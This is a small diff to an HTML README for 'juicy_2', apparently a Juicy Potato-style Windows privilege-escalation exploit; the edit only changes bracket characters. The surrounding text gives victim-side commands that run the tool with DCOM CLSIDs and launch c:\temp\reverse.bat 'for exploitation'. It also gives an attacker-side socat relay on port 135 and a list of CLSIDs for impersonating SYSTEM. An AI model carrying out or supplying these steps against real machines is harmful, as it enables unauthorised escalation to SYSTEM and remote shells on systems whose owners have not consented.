@@ -15,13 +15,13 @@ Example:<br>
   on victim:<br>
   juicy_2 -z -x 192.168.1.1 -l 9995 -n 9998 -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}<br>
   on attacker (192.168.1.1): <br>
-  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:<victim machine>:9995 
+  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:[victim machine]:9995 
 <br>
   <i><b>For exploitation:</i></b><br>
   on victim:<br>
   juicy_2 -x 192.168.1.1 -l 9995 -n 9998 -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} -t * -p c:\temp\reverse.bat<br>
   on attacker (192.168.1.1): <br>
-  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:<victim machine>:9995<br>
+  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:[victim machine]:9995<br>
 <hr>  
 If you want to impersonate SYSTEM use these CLSID's:<br>
 {C41B1461-3F8C-4666-B512-6DF24DE566D1}<br>
